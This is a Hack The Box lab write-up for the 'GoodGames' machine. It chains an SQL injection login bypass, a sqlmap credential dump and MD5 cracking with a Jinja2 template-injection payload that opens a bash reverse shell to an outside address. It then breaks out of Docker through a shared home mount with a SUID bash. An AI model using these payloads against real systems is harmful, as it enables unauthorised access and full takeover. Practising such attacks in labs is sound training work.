# HTB Write-Up: GoodGames

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/GoodGames) |
| Difficulty | Easy |
| OS | Linux |
| Date | October 23, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Access — SQL Injection Auth Bypass & Credential Dump](#initial-access-sql-injection-auth-bypass-credential-dump)
3. [Remote Code Execution — SSTI on the Internal Admin Panel](#remote-code-execution-ssti-on-the-internal-admin-panel)
4. [Privilege Escalation — Docker Breakout via Mounted Home Directory](#privilege-escalation-docker-breakout-via-mounted-home-directory)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.96.71 --ulimit=5000
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 80 | HTTP |

Only a single web service is exposed. Browsing to it revealed a login page asking for an **email** and password — no username field — which made SQL injection in the email parameter the first thing worth testing.

## Initial Access — SQL Injection Auth Bypass & Credential Dump

### 2.1 — Bypassing the Login

The login request was intercepted and the `email` field replaced with a classic boolean-based injection:

```http
POST /login HTTP/1.1
Host: 10.129.96.71
Content-Type: application/x-www-form-urlencoded

email=admin'+OR+1%3d1--+-&password=AAAA
```

The request authenticated as the admin account, exposing their real details:

```
Nick: admin
Email: admin@goodgames.htb
```

### 2.2 — Dumping Credentials with sqlmap

With a confirmed injection point and the real admin email in hand, the same request (saved to a file named `req`, with the email set to `admin@goodgames.htb`) was handed to **sqlmap**:

```bash
sqlmap -r req --dump --batch
```

Two databases were found: `main` and `information_schema`. Tables in `main` were enumerated:

```bash
sqlmap -r req -D main --tables --batch
```

```
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+
```

The `user` table was dumped:

```bash
sqlmap -r req -D main -T user --dump --batch
```

```
+----+---------------------+--------+----------------------------------+
| id | email               | name   | password                         |
+----+---------------------+--------+----------------------------------+
| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+---------------------+--------+----------------------------------+
```

### 2.3 — Cracking the Hash

The 32-character hex string was recognized as **MD5** and cracked with **John the Ripper**:

```bash
echo '2b22337f218b2d82dfc3b6f77e7cb8ec' > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
```

**Result:**

```
superadministrator (?)
```

Recovered credentials: **`admin:superadministrator`**

## Remote Code Execution — SSTI on the Internal Admin Panel

### 3.1 — Finding a Second Panel

Further exploration of the site surfaced a subdomain: **`internal-administration.goodgames.htb`**. It was added for local resolution:

```bash
echo "10.129.96.71 internal-administration.goodgames.htb goodgames.htb" | sudo tee -a /etc/hosts
```

The recovered credentials (`admin:superadministrator`) logged in successfully.

### 3.2 — Confirming SSTI

The settings page allowed editing a profile's full name, and the value was reflected back on the page. Entering `{{7*7}}` rendered as **`49`** — confirming a **Server-Side Template Injection**. The rendering engine behind it (Jinja2, Python-based) was targeted directly:

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

This returned command output directly on the page:

```
uid=0(root) gid=0(root) groups=0(root)
```

### 3.3 — Reverse Shell

A listener was started:

```bash
rlwrap nc -nvlp 4444
```

And the same SSTI primitive used to trigger a reverse shell via the full-name field:

```jinja2
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.25/4444 0>&1"').read() }}
```

```
connect to [10.10.14.25] from (UNKNOWN) [10.129.96.71] 58072
root@3a453ab39d3d:/backend#
```

The hostname (`3a453ab39d3d`) is a strong signal this shell is running inside a **Docker container**, not the real host — worth keeping in mind for privilege escalation.

### 3.4 — User Flag

```bash
root@3a453ab39d3d:/home# cd augustus
root@3a453ab39d3d:/home/augustus# cat user.txt
f96be0a655b8a1566cc9cf9bc0f551ee
```

## Privilege Escalation — Docker Breakout via Mounted Home Directory

### 4.1 — Spotting the Mount

Inside `augustus`'s home directory, files were owned by raw **UID 1000** rather than a resolved username — a classic sign that the directory is actually mounted in from the host filesystem rather than native to the container. Checking mounts confirmed it:

```bash
mount
```

```
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

`/home/augustus` is mounted from the host with **read/write** access — meaning any file written here from inside the container is also writable from the host side, and vice versa.

### 4.2 — Finding the Host

The container's own IP was identified:

```bash
ifconfig
# eth0: inet 172.19.0.2
```

A quick sweep of the Docker bridge network found the host:

```bash
for i in {1..254}; do (ping -c 1 172.19.0.$i | grep "bytes from" &); done
```

```
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.030 ms
```

With no `nmap` available in the container, a quick bash-only port sweep was used against the host instead:

```bash
for PORT in {0..1000}; do
  timeout 1 bash -c "echo >/dev/tcp/172.19.0.1/$PORT" 2>/dev/null && echo "port $PORT is open"
done
```

```
port 22 is open
port 80 is open
```

### 4.3 — Password Reuse over SSH

Since the recovered web password had already proven to be reused once, it was worth trying again against SSH on the host:

```bash
ssh augustus@172.19.0.1
# Password: superadministrator
```

It worked, landing a real shell on the host itself (`root@172.19.0.1` with the same password was tried first and failed):

```bash
hostname
# GoodGames
```

### 4.4 — Abusing the Shared Mount for a SUID Shell

The mounted `/home/augustus` directory is the bridge back to root: anything placed there as `augustus` on the host can be modified as **root** from inside the container, since the container's root user owns that filesystem path.

From the host SSH session, a copy of `bash` was placed in the home directory:

```bash
cp /bin/bash .
exit
```

Back inside the Docker container (root), the copied binary was given root ownership and the **SUID** bit:

```bash
chown root:root bash
chmod 4755 bash
```

The `4` sets the SUID bit, so the binary always executes as its owner (root) regardless of who runs it; `755` keeps it executable by everyone.

### 4.5 — Root Flag

Back on the host as `augustus`, the now-SUID `bash` binary gave a root shell:

```bash
ssh augustus@172.19.0.1
# Password: superadministrator
./bash -p
```

```
bash-5.0# cat /root/root.txt
b8f7436bc895c8478cff458108120f94
```
